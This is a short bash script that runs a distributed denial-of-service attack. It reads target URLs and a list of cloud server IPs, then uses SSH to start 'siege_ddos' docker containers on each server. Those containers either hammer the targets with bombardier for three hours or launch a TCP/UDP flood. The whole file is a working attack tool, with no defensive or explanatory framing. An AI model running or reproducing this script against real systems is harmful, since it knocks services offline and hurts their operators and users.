
usage() {
    cat <<EOF
bash $1 --url list.txt [--nj 1000] [--attack stress|flood] [--protocol tcp|udp]
EOF
}


url_list=""
nj="1500"
attack="stress"
protocol="TCP"
while [ "$1" != "" ]; do
    case $1 in
        --url )
            shift
            url_list=$1
        ;;
        --nj )
            shift
            nj=$1
        ;;
        --attack )
            shift
            attack=$1
        ;;
        --protocol )
            shift
            protocol=$1
        ;;
        -h | --help ) usage $0
            exit
        ;;
        * ) usage $0
            exit 1
    esac
    shift
done
if [ ! -f $url_list ]; then
  echo "cant open url list $url_list"
  exit 1
fi
urls_num=$(wc -l $url_list | awk '{print $1}')

ips_path="ips.txt"
if [ ! -f "$ips_path" ]; then
  ips_path="aws/ips.txt"
fi
if [ ! -f "$ips_path" ]; then
  echo "cant find ips.txt"
  exit 1
fi
nj_per_machine=$(echo $((nj / urls_num)))

for url in $(cat $url_list); do
  for ip in $(cat $ips_path); do
    if [ "$attack" == "stress" ]; then
      ssh ubuntu@${ip} docker run -d myuatools/siege_ddos bombardier -d 3h -c $nj_per_machine -l $url
    elif [ "$attack" == "flood" ]; then
      url_only=$(echo $url | perl -nle '/(.+)(\:\d+)/; print $1')
      if [ -z "$url_only" ]; then
        url_only="$(echo $url)"
        port=""
      else
        port="--port $(echo $url | awk -F':' '{print $NF}')"
      fi
      if [[ $url == http* ]]; then
        echo "for siege - do not prepend url with http(s)"
	exit 1
      fi
      ssh ubuntu@${ip} docker run -d myuatools/siege_ddos python3 -m siege_engine $nj_per_machine $url --protocol $protocol $port
    else
      echo "unknown attack type ${attack}"
    fi
  done
done
